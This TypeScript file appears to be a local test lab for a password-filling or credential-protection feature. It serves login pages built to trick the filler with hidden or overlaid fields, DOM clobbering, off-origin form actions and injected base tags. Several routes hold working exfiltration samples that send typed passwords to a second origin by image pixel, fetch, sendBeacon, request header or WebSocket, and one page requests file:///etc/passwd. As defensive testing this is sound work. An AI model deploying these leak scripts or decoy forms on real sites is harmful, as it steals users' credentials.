import { createHash } from 'node:crypto';
import { createServer, type IncomingMessage, type Server } from 'node:http';
import type { Duplex } from 'node:stream';

type Origins = Readonly<{ primary: string; secondary: string }>;
type Route = (origins: Origins) => string;
type LabRequest = Readonly<{ method: string; path: string }>;

export const CONTROL_LAB_ROUTES = Object.freeze({
  '/password-basic': () => loginForm(),
  '/contenteditable': () => formWithField('<div id="password" contenteditable="true"></div>'),
  '/text-input': () => formWithField('<input id="password" type="text">'),
  '/disabled': () => loginForm('disabled'),
  '/readonly': () => loginForm('readonly'),
  '/hidden-attribute': () => loginForm('hidden'),
  '/display-none': () => loginForm('style="display:none"'),
  '/visibility-hidden': () => loginForm('style="visibility:hidden"'),
  '/opacity-zero': () => loginForm('style="opacity:0"'),
  '/ancestor-opacity-zero': () => `<div style="opacity:0">${loginForm()}</div>`,
  '/ancestor-filter-opacity-zero': () => `<div style="filter:opacity(0)">${loginForm()}</div>`,
  '/offscreen': () => loginForm('style="position:fixed;left:-10000px;top:-10000px"'),
  '/scale-zero': () => loginForm('style="transform:scale(0)"'),
  '/overlay': () => `${loginForm()}<div class="overlay"></div>${overlayStyle()}`,
  '/formless': () => '<input id="password" type="password">',
  '/off-origin-action': ({ secondary }) => loginForm('', `action="${secondary}/submit"`),
  '/base-off-origin': ({ secondary }) => `<base href="${secondary}/">${loginForm('', 'action="/login"')}`,
  '/base-same-origin': ({ primary }) => `<base href="${primary}/nested/">${loginForm('', 'action="/login"')}`,
  '/clobber-baseuri-off-origin': ({ primary, secondary }) => `<base href="${secondary}/nested/">${loginForm(
    '', `action="${primary}/login"`,
  )}<script>Object.defineProperty(document,'baseURI',{value:'${primary}/'})</script>`,
  '/clobber-baseuri-same-origin': ({ primary }) => `<base href="${primary}/nested/">${loginForm(
    '', 'action="/login"',
  )}<script>Object.defineProperty(document,'baseURI',{value:'${primary}/'})</script>`,
  '/base-plus-formaction': ({ primary, secondary }) => `<base href="${secondary}/nested/">${loginForm(
    '', `action="${primary}/login"`, '<button type="submit" formaction="login">Go</button>',
  )}`,
  '/clobbered-action-off-origin': ({ secondary }) =>
    loginForm('', `action="${secondary}/submit"`, '<input name="action">'),
  '/clobbered-action-same-origin': () => loginForm('', 'action="/submit"', '<input name="action">'),
  '/descendant-formaction': ({ secondary }) =>
    loginForm('', '', `<button type="submit" formaction="${secondary}/submit">Go</button>`),
  '/external-formaction': ({ secondary }) =>
    `${loginForm('', 'id="login"', '')}<button form="login" formaction="${secondary}/submit">Go</button>`,
  '/image-formaction': ({ secondary }) =>
    loginForm('name="pw"', '', `<input type="image" formaction="${secondary}/steal" alt="Go">`),
  '/image-formaction-external': ({ secondary }) =>
    `${loginForm('name="pw"', 'id="login"', '')}<input type="image" form="login" formaction="${secondary}/steal" alt="Go">`,
  '/foreign-form-claims-field': ({ secondary }) =>
    `<form method="post" action="/submit"><input id="password" type="password" form="evil"></form>
      <form id="evil" method="post" action="${secondary}/steal"></form>`,
  '/clobbered-elements-off-origin': ({ secondary }) => loginForm(
    '', 'id="login"', `<input name="elements"><button form="login" formaction="${secondary}/submit">Go</button>`,
  ),
  '/clobbered-elements-same-origin': () =>
    loginForm('', 'id="login"', '<input name="elements"><button form="login" formaction="/submit">Go</button>'),
  '/clobber-getattribute-same-origin': ({ secondary }) => `${loginForm()}<script>
    document.querySelector('form').getAttribute=()=> '${secondary}/submit';
  </script>`,
  '/clobber-getattribute-off-origin': ({ secondary }) => `${loginForm('', `action="${secondary}/submit"`)}<script>
    document.querySelector('form').getAttribute=()=> '/submit';
  </script>`,
  '/patched-type': () => `${formWithField('<input id="password" type="text">')}<script>
    Object.defineProperty(HTMLInputElement.prototype, 'type', { get: () => 'password' });
  </script>`,
  '/poisoned-getattribute': () => `${formWithField('<input id="password" type="text">')}<script>
    Element.prototype.getAttribute=function(name){return name==='type'?'password':null};
  </script>`,
  '/poisoned-setter': () => `${loginForm()}<script>
    Object.defineProperty(HTMLInputElement.prototype, 'value', {
      configurable: true, get: () => 'poisoned', set: value => { window.__leak = value; }
    });
  </script>`,
  '/below-fold': () => `<div style="height:2000px"></div>${loginForm()}`,
  '/label-overlay': () => `${loginForm()}<label for="password" class="label-overlay">Password</label>
    <style>.label-overlay{position:absolute;left:0;top:0;width:100%;height:100%;z-index:2}</style>`,
  '/smooth-scroll': () => `<style>html{scroll-behavior:smooth}</style><div style="height:2000px"></div>${loginForm()}`,
  '/main-and-subframe': ({ secondary }) => `${loginForm()}<iframe src="${secondary}/password-basic"></iframe>`,
  '/cross-origin-frame-only': ({ secondary }) => `<iframe src="${secondary}/password-basic"></iframe>`,
  '/same-origin-frame-only': () => '<iframe src="/password-basic"></iframe>',
  '/nowhere': () => '<main>No password control</main>',
  '/redirect-start': () => '<main>redirect response replaces this body</main>',
  '/redirect-middle': () => '<main>redirect response replaces this body</main>',
  '/redirect-final': () => loginForm(),
  '/document-open-after-pin': () => mutationPage("document.open();document.write('<p>new document</p>');document.close()"),
  '/remove-after-pin': () => mutationPage("document.querySelector('#password').remove()"),
  '/replace-after-pin': () => mutationPage(`document.querySelector('#password').outerHTML =
    '<input id="password" type="password">'`),
  '/action-after-pin': ({ secondary }) => mutationPage(
    `document.querySelector('form').setAttribute('action', '${secondary}/submit')`,
  ),
  '/base-injected-after-pin': ({ secondary }) => mutationPage(
    `var base=document.createElement('base');base.href='${secondary}/';document.head.appendChild(base)`,
  ),
  '/image-formaction-after-pin': ({ secondary }) => mutationPage(
    `document.querySelector('form').insertAdjacentHTML('beforeend',
      '<input type="image" formaction="${secondary}/steal" alt="Go">')`,
  ),
  '/opacity-after-pin': () => mutationPage("document.querySelector('form').style.opacity = '0'"),
  '/overlay-after-pin': () => mutationPage(`var overlay=document.createElement('div');
    overlay.className='overlay';document.body.appendChild(overlay)`, overlayStyle()),
  '/push-state-after-pin': () => mutationPage("history.pushState({}, '', '/pushed')"),
  '/token-rewrite': () => `${loginForm('data-tv-control="control-before"')}
    <script>var target=document.querySelector('#password');
    document.documentElement.setAttribute('data-tv-document','document-before');
    target.addEventListener('input',()=>{
      target.setAttribute('data-tv-control','control-after');
      document.documentElement.setAttribute('data-tv-document','document-after');
    });</script>`,
  '/mirror-span': () => `${loginForm()}<span id="mirror">empty</span>
    <script>var target=document.querySelector('#password');var mirror=document.querySelector('#mirror');
    target.addEventListener('input',()=>{mirror.textContent=target.value})</script>`,
  '/echo-field': () => '<input id="echo" aria-label="Echo"><p>echo page</p>',
  '/self-navigating-iframe': () => `${loginForm()}<iframe src="/iframe-self"></iframe>`,
  '/iframe-self': () => '<script>setTimeout(()=>location.href="/iframe-final",20)</script>',
  '/iframe-final': () => '<p>iframe navigated</p>',
  '/static-token-login': () => loginForm('data-tv-control="static-control"', '',
    '<input id="username" value="fixture-user"><button id="submit" type="submit">Go</button>'),
  '/storage': () => `<input id="cookie"><input id="local"><script>
    var set=new URL(location.href).searchParams.get('set');
    if(set){document.cookie='tv='+set;localStorage.setItem('tv',set)}
    document.querySelector('#cookie').value=(document.cookie.match(/(?:^|; )tv=([^;]*)/)||[])[1]||'';
    document.querySelector('#local').value=localStorage.getItem('tv')||'';
  </script>`,
  '/controls': () => '<button id="button">Click</button><input id="username"><p>control page</p>',
  '/post-body': () => '<form method="post" action="/submit"><input id="payload" name="payload"><button type="submit">Post</button></form>',
  '/query-leak': ({ secondary }) => `${loginForm()}<script>
    document.querySelector('#password').addEventListener('input', function () {
      new Image().src = '${secondary}/pixel?p=' + this.value;
    });
  </script>`,
  '/file-request': () => `${loginForm()}<img src="file:///etc/passwd">`,
  '/blob-leak': ({ secondary }) => `${loginForm()}<script>
    document.querySelector('#password').addEventListener('input', function () {
      fetch('${secondary}/blob-fetch', { method: 'POST', body: new Blob([this.value]) }).catch(() => {});
      navigator.sendBeacon('${secondary}/blob-beacon', new Blob([this.value]));
    });
  </script>`,
  '/header-leak': ({ secondary }) => `${loginForm()}<script>
    document.querySelector('#password').addEventListener('input', function () {
      fetch('${secondary}/header-receive', { headers: { 'x-tv-leak': this.value } }).catch(() => {});
    });
  </script>`,
  '/ws-leak': ({ secondary }) => `${loginForm()}<script>
    var socket = new WebSocket('${secondary.replace('http:', 'ws:')}/ws-receive');
    document.querySelector('#password').addEventListener('input', function () {
      var value = this.value;
      if (socket.readyState === WebSocket.OPEN) socket.send(value);
      else socket.addEventListener('open', () => socket.send(value), { once: true });
    });
  </script>`,
} satisfies Record<string, Route>);

export type ControlsLab = Readonly<{
  primaryOrigin: string;
  secondaryOrigin: string;
  secondaryRequests(): readonly LabRequest[];
  close(): Promise<void>;
}>;

export async function startControlsLab(): Promise<ControlsLab> {
  let origins: Origins = { primary: '', secondary: '' };
  const secondaryRequests: LabRequest[] = [];
  const secondary = createServer((request, response) => {
    secondaryRequests.push(Object.freeze({
      method: request.method ?? '',
      path: new URL(request.url ?? '/', 'http://fixture.invalid').pathname,
    }));
    serve(request.url, response, () => origins);
  });
  attachWebSocketServer(secondary, secondaryRequests);
  const secondaryOrigin = await listen(secondary);
  const primary = createServer((request, response) => serve(request.url, response, () => origins));
  attachWebSocketServer(primary, []);
  let primaryOrigin: string;
  try {
    primaryOrigin = await listen(primary);
  } catch (error) {
    await closeServer(secondary);
    throw error;
  }
  origins = { primary: primaryOrigin, secondary: secondaryOrigin };
  return Object.freeze({
    primaryOrigin,
    secondaryOrigin,
    secondaryRequests: () => Object.freeze([...secondaryRequests]),
    close: async () => { await Promise.all([closeServer(primary), closeServer(secondary)]); },
  });
}

function serve(
  rawUrl: string | undefined,
  response: import('node:http').ServerResponse,
  getOrigins: () => Origins,
): void {
  const path = new URL(rawUrl ?? '/', 'http://fixture.invalid').pathname;
  if (path === '/redirect-start') return redirect(response, '/redirect-middle');
  if (path === '/redirect-middle') return redirect(response, '/redirect-final');
  if (path === '/submit' || path === '/login') {
    response.statusCode = 200;
    response.end('ok');
    return;
  }
  const route = CONTROL_LAB_ROUTES[path as keyof typeof CONTROL_LAB_ROUTES];
  response.setHeader('content-type', 'text/html; charset=utf-8');
  response.setHeader('access-control-allow-origin', '*');
  response.setHeader('access-control-allow-headers', 'x-tv-leak');
  response.setHeader('access-control-allow-methods', 'GET, POST, OPTIONS');
  if (response.req.method === 'OPTIONS') {
    response.statusCode = 204;
    response.end();
    return;
  }
  response.statusCode = route === undefined ? 404 : 200;
  response.end(document(
    route === undefined ? '<main>not found</main>' : route(getOrigins()),
    path === '/static-token-login' ? 'data-tv-document="static-document"' : '',
  ));
}

function attachWebSocketServer(server: Server, requests: LabRequest[]): void {
  server.on('upgrade', (request: IncomingMessage, socket: Duplex) => {
    const key = request.headers['sec-websocket-key'];
    if (typeof key !== 'string') {
      socket.destroy();
      return;
    }
    requests.push(Object.freeze({
      method: request.method ?? '',
      path: new URL(request.url ?? '/', 'http://fixture.invalid').pathname,
    }));
    const accept = createHash('sha1')
      .update(`${key}258EAFA5-E914-47DA-95CA-C5AB0DC85B11`)
      .digest('base64');
    socket.write([
      'HTTP/1.1 101 Switching Protocols',
      'Upgrade: websocket',
      'Connection: Upgrade',
      `Sec-WebSocket-Accept: ${accept}`,
      '',
      '',
    ].join('\r\n'));
    socket.on('data', () => undefined);
    const tracked = upgradedSockets.get(server) ?? new Set<Duplex>();
    tracked.add(socket);
    upgradedSockets.set(server, tracked);
    socket.on('close', () => { tracked.delete(socket); });
  });
}

function loginForm(
  inputAttributes = '',
  formAttributes = '',
  extra = '<button type="submit">Go</button>',
): string {
  const form = attributesWithDefaults([['method', 'post'], ['action', '/submit']], formAttributes);
  const input = attributesWithDefaults([['id', 'password'], ['type', 'password']], inputAttributes);
  return `<form ${form}>
    <input ${input}>${extra}</form>`;
}

function attributesWithDefaults(
  defaults: readonly (readonly [name: string, value: string])[],
  supplied: string,
): string {
  const attributes = defaults
    .filter(([name]) => !new RegExp(`(?:^|\\s)${name}(?:\\s*=|\\s|$)`, 'iu').test(supplied))
    .map(([name, value]) => `${name}="${value}"`);
  if (supplied.trim() !== '') attributes.push(supplied.trim());
  return attributes.join(' ');
}

function formWithField(field: string): string {
  return `<form method="post" action="/submit">${field}<button type="submit">Go</button></form>`;
}

function mutationPage(statement: string, extra = ''): string {
  return `${loginForm()}<button id="mutate" type="button">Mutate</button>${extra}
    <script>document.querySelector('#mutate').addEventListener('click',()=>{${statement}})</script>`;
}

function overlayStyle(): string {
  return '<style>.overlay{position:fixed;inset:0;z-index:10;background:rgba(0,0,0,.01)}</style>';
}

function document(body: string, htmlAttributes: string): string {
  const base = body.match(/^<base\b[^>]*>/u)?.[0] ?? '';
  const bodyWithoutBase = base === '' ? body : body.slice(base.length);
  return `<!doctype html><html ${htmlAttributes}><head><meta charset="utf-8">${base}</head><body>${bodyWithoutBase}</body></html>`;
}

function redirect(response: import('node:http').ServerResponse, location: string): void {
  response.statusCode = 302;
  response.setHeader('location', location);
  response.end();
}

function listen(server: Server): Promise<string> {
  return new Promise((resolve, reject) => {
    server.once('error', reject);
    server.listen(0, '127.0.0.1', () => {
      server.off('error', reject);
      const address = server.address();
      if (address === null || typeof address === 'string') return reject(new Error('Controls lab did not bind'));
      resolve(`http://127.0.0.1:${address.port}`);
    });
  });
}

// Upgraded (WebSocket) sockets leave the http server's connection list, so server.close() would wait on them
// forever; they are tracked per server and destroyed first (the afterAll hook timed out without this).
const upgradedSockets = new WeakMap<Server, Set<Duplex>>();

function closeServer(server: Server): Promise<void> {
  for (const socket of upgradedSockets.get(server) ?? []) socket.destroy();
  server.closeAllConnections();
  return new Promise((resolve, reject) => server.close((error) => error ? reject(error) : resolve()));
}
